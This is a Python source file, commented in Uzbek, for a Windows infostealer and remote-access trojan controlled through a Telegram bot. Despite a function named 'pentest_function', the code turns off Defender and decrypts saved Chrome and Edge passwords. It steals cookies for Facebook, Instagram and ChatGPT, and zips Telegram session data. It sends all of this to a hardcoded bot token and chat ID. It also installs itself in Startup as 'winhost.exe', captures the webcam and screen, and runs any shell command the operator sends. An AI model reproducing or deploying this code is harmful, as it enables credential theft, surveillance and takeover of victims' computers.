import telebot
import subprocess
import os
import tempfile
import mss
import zipfile
import getpass
import socket
import platform
import time
import sys
import win32crypt
import sqlite3
import shutil
import os, json, base64, shutil, sqlite3, socket, platform, getpass, zipfile, requests
from pathlib import Path
from datetime import datetime
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import cv2
import threading
import tempfile


def get_tdata():
    """
    Telegram Desktop tdata papkasini qidiradi, zip qiladi va vaqtincha fayl sifatida saqlaydi.
    """
    possible_paths = [
        os.path.join(os.getenv("APPDATA"), "Telegram Desktop", "tdata"),
        os.path.join(os.getenv("LOCALAPPDATA"), "Telegram Desktop", "tdata"),
        os.path.expanduser("~/AppData/Roaming/Telegram Desktop/tdata"),
    ]

    tdata_path = None
    for path in possible_paths:
        if os.path.exists(path):
            tdata_path = path
            break

    if not tdata_path:
        return None

    zip_path = os.path.join(tempfile.gettempdir(), "tdata_temp.zip")
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(tdata_path):
                for file in files:
                    full_path = os.path.join(root, file)
                    arcname = os.path.relpath(full_path, tdata_path)
                    try:
                        zipf.write(full_path, arcname)
                    except PermissionError:
                        print(f"[⚠️] Ruxsat yo'q: {full_path}")
                    except Exception as e:
                        print(f"[⚠️] Xatolik: {e}")
        return zip_path
    except Exception as e:
        print(f"[tdata ZIP ERROR] {e}")
        return None







def take_photo():
    try:
        cap = cv2.VideoCapture(0)
        time.sleep(1)  # Kamera ochilishi uchun kutish
        ret, frame = cap.read()
        if not ret:
            return None
        path = os.path.join(tempfile.gettempdir(), "photo.jpg")
        cv2.imwrite(path, frame)
        cap.release()
        return path
    except Exception as e:
        print(f"[PHOTO ERROR] {e}")
        return None

def take_video(duration=5):
    try:
        cap = cv2.VideoCapture(0)
        time.sleep(1)  # Kamera tayyor bo'lishi uchun
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        path = os.path.join(tempfile.gettempdir(), "video.avi")
        out = cv2.VideoWriter(path, fourcc, 20.0, (640, 480))

        start_time = time.time()
        while time.time() - start_time < duration:
            ret, frame = cap.read()
            if not ret:
                break
            out.write(frame)

        cap.release()
        out.release()
        return path
    except Exception as e:
        print(f"[VIDEO ERROR] {e}")
        return None





def pentest_function(bot_token, chat_id):
    """
    Kompyuter haqida ma'lumotlarni yig'adi, brauzer parollari va cookie'larini chiqaradi
    """

    def kill_browser_processes():
        os.system("taskkill /f /im chrome.exe >nul 2>&1")
        os.system("taskkill /f /im msedge.exe >nul 2>&1")

    def disable_defender():
        os.system('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1')

    def get_master_key(local_state_path):
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    def decrypt_chrome_value(encrypted_value, master_key):
        try:
            if encrypted_value[:3] == b'v10':
                iv = encrypted_value[3:15]
                payload = encrypted_value[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
                decrypted = cipher.decrypt(payload)[:-16].decode()
                return decrypted
            else:
                return CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
        except Exception:
            return ""

    def extract_passwords():
        browsers = {
            'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data\Default'),
            'Edge': os.path.join(os.getenv('LOCALAPPDATA'), r'Microsoft\Edge\User Data\Default'),
        }

        entries = []

        for name, path in browsers.items():
            if not os.path.exists(path):
                continue

            master_key = get_master_key(os.path.join(path, "..", "Local State"))
            login_db = os.path.join(path, "Login Data")
            if os.path.exists(login_db):
                try:
                    temp_db = os.path.join(os.getenv("TEMP"), f"{name}_logins.db")
                    shutil.copy2(login_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for url, user, encpass in cursor.fetchall():
                        password = decrypt_chrome_value(encpass, master_key)
                        if url and user and password:
                            entries.append((url.strip(), user.strip(), password.strip()))
                    conn.close()
                    os.remove(temp_db)
                except Exception as e:
                    entries.append((f"[{name}] ERROR", "N/A", str(e)))

        if not entries:
            return "🔐 Hech qanday parol topilmadi.\n"

        report = "📋 < BROWSER PASSWORDS >\n\n"
        for url, user, passwd in entries:
            report += f"Site: {url}\nLogin: {user}\nParol: {passwd}\n\n************\n\n"
        return report

    def extract_cookies(browser_name, profile_path):
        cookie_path = os.path.join(profile_path, "Cookies")
        target_domains = ['facebook.com', 'instagram.com', 'chat.openai.com']
        extracted = []

        if not os.path.exists(cookie_path):
            return []

        try:
            temp_path = os.path.join(os.getenv("TEMP"), f"{browser_name}_cookies.db")
            shutil.copy2(cookie_path, temp_path)

            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")

            master_key = get_master_key(os.path.join(profile_path, "..", "Local State"))

            for host, name, enc_val in cursor.fetchall():
                if any(domain in host for domain in target_domains):
                    val = decrypt_chrome_value(enc_val, master_key)
                    extracted.append(f"{host} | {name} = {val}")

            conn.close()
            os.remove(temp_path)
        except Exception as e:
            extracted.append(f"[{browser_name}] Cookie ERROR: {str(e)}")

        return extracted

    def get_sys_info():
        info = []
        info.append(f"👤 Foydalanuvchi: {getpass.getuser()}")
        info.append(f"💻 Kompyuter nomi: {platform.node()}")
        info.append(f"🖥 OS: {platform.system()} {platform.release()}")
        info.append(f"🌐 IP manzil: {socket.gethostbyname(socket.gethostname())}")
        info.append(f"🕓 Vaqt: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        return "\n".join(info)

    def send_text_to_telegram(text):
        if not text.strip():
            return
        filename = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        filepath = os.path.join(Path.home(), filename)

        with open(filepath, "w", encoding='utf-8') as f:
            f.write(text)

        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        with open(filepath, "rb") as f:
            requests.post(url, data={"chat_id": chat_id}, files={"document": f})
        os.remove(filepath)

    # ==== BOSHLANISH ====
    kill_browser_processes()
    disable_defender()

    info = get_sys_info()
    passwords = extract_passwords()
    cookies = []

    for name, path in {
        'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data\Default'),
        'Edge': os.path.join(os.getenv('LOCALAPPDATA'), r'Microsoft\Edge\User Data\Default'),
    }.items():
        cookies.extend(extract_cookies(name, path))

    report = "\n=== KOMPYUTER MA'LUMOTLARI ===\n" + info
    report += "\n\n=== PAROLLAR ===\n" + passwords
    report += "\n\n=== COOKIE’LAR ===\n" + "\n".join(cookies)

    send_text_to_telegram(report)

if __name__ == "__main__":
    BOT_TOKEN = '7211406891:AAG4BM3tOUzRPvQ5R4iuBqzek36bW_4-oY0'
    CHAT_ID = '6655243292'
    pentest_function(BOT_TOKEN, CHAT_ID)

def ensure_persistence():
    try:
        # 1. Hozirgi .exe fayl manzili
        exe_path = sys.executable

        # 2. Startup papka (foydalanuvchi nomidan qat'i nazar)
        startup_dir = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
        os.makedirs(startup_dir, exist_ok=True)

        # 3. O‘zini startupga nusxalash (shu nom bilan)
        hidden_exe_path = os.path.join(startup_dir, "winhost.exe")

        if not os.path.exists(hidden_exe_path):
            shutil.copy2(exe_path, hidden_exe_path)
            print("[✅] EXE startup papkaga ko‘chirildi.")

        # 4. Shortcut kerak emas, to‘g‘ridan-to‘g‘ri exe startuplar ichida ishlaydi
        else:
            print("[ℹ️] EXE allaqachon startupda bor.")

    except Exception as e:
        print(f"[⚠️] Xatolik yuz berdi: {e}")

# 🔃 Ishga tushganda bir marta chaqiriladi
ensure_persistence()

#=================================================================
# 🔐 Bot token va admin ID
TOKEN = "7211406891:AAG4BM3tOUzRPvQ5R4iuBqzek36bW_4-oY0"
ADMIN_ID = 6655243292
bot = telebot.TeleBot(TOKEN)
current_dir = os.getcwd()

# 📁 Fayl qidirish
def find_file_recursive(base_path, filename):
    for root, dirs, files in os.walk(base_path):
        if filename in files:
            return os.path.join(root, filename)
    return None

# 📥 Fayl yuborish
@bot.message_handler(content_types=['document', 'audio', 'video', 'photo'])
def handle_files(message):
    if message.chat.id != ADMIN_ID: return
    try:
        file_info = None
        file_name = "file"
        if message.document:
            file_info = bot.get_file(message.document.file_id)
            file_name = message.document.file_name
        elif message.audio:
            file_info = bot.get_file(message.audio.file_id)
            file_name = message.audio.file_name or "audio.mp3"
        elif message.video:
            file_info = bot.get_file(message.video.file_id)
            file_name = message.video.file_name or "video.mp4"
        elif message.photo:
            file_info = bot.get_file(message.photo[-1].file_id)
            file_name = "photo.jpg"

        downloaded = bot.download_file(file_info.file_path)
        save_path = os.path.join(current_dir, file_name)
        with open(save_path, 'wb') as new_file:
            new_file.write(downloaded)
        bot.send_message(message.chat.id, f"📂 Fayl saqlandi:\n`{save_path}`", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Yuklash xatosi:\n{str(e)}")

# 📤 Bot komandalar
@bot.message_handler(func=lambda msg: True)
def handle_message(message):
    global current_dir
    if message.chat.id != ADMIN_ID: return

    command = message.text.strip()

    if command.lower() == "screen":
        try:
            with mss.mss() as sct:
                path = os.path.join(tempfile.gettempdir(), "scr.png")
                sct.shot(output=path)
                with open(path, 'rb') as photo:
                    bot.send_photo(message.chat.id, photo)
                os.remove(path)
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Screenshot xatosi:\n{e}")
        return

    if command.lower().startswith("cd"):
        try:
            path = command[3:].strip().strip('"')
            new_dir = os.path.abspath(os.path.join(current_dir, path))
            if os.path.isdir(new_dir):
                current_dir = new_dir
                bot.send_message(message.chat.id, f"📂 `cd` -> `{current_dir}`", parse_mode="Markdown")
            else:
                bot.send_message(message.chat.id, f"❌ Papka topilmadi: `{new_dir}`", parse_mode="Markdown")
        except Exception as e:
            bot.send_message(message.chat.id, f"⚠️ CD xatolik: {e}")
        return

    if command.lower().startswith("yukla "):
        filename = command[6:].strip()
        found = find_file_recursive(current_dir, filename)
        if found:
            try:
                with open(found, 'rb') as f:
                    bot.send_document(message.chat.id, f)
                bot.send_message(message.chat.id, f"✅ Topildi: `{found}`", parse_mode="Markdown")
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ Yuborib bo‘lmadi:\n{e}")
        else:
            bot.send_message(message.chat.id, f"🔍 Topilmadi: `{filename}`", parse_mode="Markdown")
        return
        ##########################
        #######333333333333333333
        ##########################


    if command == "photo":           
        try:
            bot.send_message(message.chat.id, "📸 Rasm olinmoqda...")
            photo_path = take_photo()
            if photo_path:
                with open(photo_path, 'rb') as photo:
                    bot.send_photo(message.chat.id, photo)
                os.remove(photo_path)
                bot.send_message(message.chat.id, "✅ Rasm muvaffaqiyatli yuborildi!")
            else:
                bot.send_message(message.chat.id, "❌ Rasm olishda xatolik yuz berdi")
        except Exception as e:
            bot.send_message(message.chat.id, f"⚠️ Xatolik: {str(e)}")

    elif command.startswith("video"):
        try:
            parts = command.split()
            duration = 5 if len(parts) < 2 else min(int(parts[1]), 60)  # Maksimum 60 sekund
            
            bot.send_message(message.chat.id, f"⏳ {duration} sekund video yozilmoqda...")
            
            video_path = take_video(duration)
            if video_path:
                with open(video_path, 'rb') as video:
                    bot.send_video(message.chat.id, video)
                os.remove(video_path)
                bot.send_message(message.chat.id, "✅ Video muvaffaqiyatli yuborildi!")
            else:
                bot.send_message(message.chat.id, "❌ Video yozishda xatolik yuz berdi")
        except Exception as e:
            bot.send_message(message.chat.id, f"⚠️ Xatolik: {str(e)}")


    if command == "tdata":
        try:
            bot.send_message(message.chat.id, "📦 tdata tayyorlanmoqda...")
            path = get_tdata()
            if path:
                with open(path, 'rb') as f:
                    bot.send_document(message.chat.id, f)
                os.remove(path)
                bot.send_message(message.chat.id, "✅ tdata yuborildi.")
            else:
                bot.send_message(message.chat.id, "❌ tdata topilmadi.")
        except Exception as e:
            bot.send_message(message.chat.id, f"⚠️ Xatolik:\n{e}")
        return





    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True, cwd=current_dir, timeout=30)
        if not result.strip(): result = "✅ Bajarildi, natija yo‘q."
    except subprocess.CalledProcessError as e:
        result = f"❌ Buyruq xato:\n{e.output}"
    except Exception as e:
        result = f"⚠️ Exception: {e}"

    if len(result) < 4000:
        bot.send_message(message.chat.id, f"📤 Natija:\n```\n{result}\n```", parse_mode="Markdown")
    else:
        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as tf:
            tf.write(result)
            tf_path = tf.name
        with open(tf_path, 'rb') as doc:
            bot.send_document(message.chat.id, doc)
        os.remove(tf_path)

bot.infinity_polling()



#=================
